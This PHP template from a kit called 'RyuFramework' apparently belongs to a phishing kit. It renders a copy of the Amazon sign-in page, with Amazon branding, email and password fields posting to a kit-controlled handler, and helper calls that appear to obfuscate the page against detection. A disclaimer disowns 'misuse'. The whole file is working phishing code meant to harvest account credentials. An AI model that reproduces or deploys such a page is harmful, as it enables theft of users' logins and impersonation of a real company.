<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:23 )
* @filename signin.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/


?>
<!doctype html>
<html lang="<?=$this->lang;?>">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta charset="utf-8">
    <title dir="ltr"><?=translate('Amazon Sign In',$this->lang,1);?></title>

    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
    <script type="text/javascript" src="assets/js/jquery.min.js"></script>  

    <script type="text/javascript" src="assets/js/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery.payment.min.js"></script>
    <script type="text/javascript" src="assets/js/custom.js"></script>

    <link rel="stylesheet" type="text/css" href="assets/css/amz.css">
    <link rel="stylesheet" type="text/css" href="assets/css/v.css">

</head>
<?=$this->sec->keymani();?>
<?=$this->sec->keymani();?>

<body>
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none">
                <div class="a-section a-spacing-medium a-text-center">
                    <center><img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['amz_logo']);?>" onContextMenu="return false;"></center>
                </div>
            </div>
            <div class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container">
                    <div class="a-section">
                      
                        <form method="post" action="<?=$this->form_action_page('signin');?>" class="auth-validate-form a-spacing-none">
                            <div class="a-section">
                                <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                        <h1 class="a-spacing-small">
            <?=translate('Sign in',$this->lang);?>
          </h1>
                                        <div class="a-row a-spacing-base">
                                            <label for="ml">
                                                <?=translate('Email (phone for mobile account)',$this->lang);?>
                                            </label>
                                            <input type="email" required="required" maxlength="128" id="ml" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                        </div>
                                        <input type="hidden" name="create" value="0">
                                        <div class="a-section a-spacing-large">
                                            <div class="a-row">
                                                <div class="a-column a-span5">
                                                    <label for="pd">
                                                        <?=translate('Password',$this->lang);?>
                                                    </label>
                                                </div>
                                                <div class="a-column a-span7 a-text-right a-span-last">
                                                    <a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
        <?=translate('Forgot your password?',$this->lang);?>
      </a>
                                                </div>
                                            </div>
                                            <input type="password" id="pd" name="password" required="required" tabindex="2" class="a-input-text a-span12 auth-required-field">
                                        </div>
                                        <div class="a-section a-spacing-extra-large">
                                            <span class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true">
              <?=translate('Sign in',$this->lang);?>
            </span></span>
                                            </span>
                                        </div>
                                        <div class="a-divider a-divider-break">
                                            <h5><?=translate('New to Amazon?',$this->lang);?></h5></div>
                                        <span id="auth-create-account-link" class="a-button a-button-span12" role="button" aria-labelledby="createAccountSubmit"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text">
                <?=translate('Create your Amazon account',$this->lang);?>
              </a></span></span>
                                    </div>
                                </div>
                            </div>

                        </form>
                    </div>
                </div>
            </div><hr>
            <div id="right-2">
            </div>
            <center>
            <div>
                <a href="#" style="font-size: 11px;"><?=translate('Condition of Use',$this->lang);?></a>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <a href="#" style="font-size: 11px;"><?=translate('Privacy Notice',$this->lang);?></a>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <a href="#" style="font-size: 11px;"><?=translate('Help',$this->lang);?></a>
            </div><br>
            <div>
                <p style="font-size: 11px;">&copy; 1996 - <?php echo date('Y'); ?> <?=lettering(CONFIG['amz']['domain']);?>, <?=lettering('Inc. or its affiliates');?></p>
            </div>
            </center>
        </div>
    </div>
</body>
<?=$this->sec->keymani();?>

</html>